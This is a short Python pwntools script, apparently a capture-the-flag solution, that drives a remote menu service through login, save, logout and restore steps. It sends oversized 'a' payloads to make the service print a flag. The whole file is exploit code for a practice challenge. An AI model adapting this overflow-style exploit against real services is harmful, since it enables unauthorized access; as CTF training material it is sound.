from pwn import *

r = remote("thekidofarcrania.com", 13226)

#Login
r.recv()
r.sendline("1")
time.sleep(0.5)
r.sendline(b"a"*31)

#Save
r.sendline("4")
time.sleep(0.5)

#Logout
r.sendline("2")
time.sleep(0.5)

#Input Flag
r.sendline("3")
time.sleep(0.5)
payload = "\x61"*40
r.sendline(payload)

#Restore
r.recv()
r.sendline("5")

#Print flag
r.recv()
r.sendline("3")


r.interactive()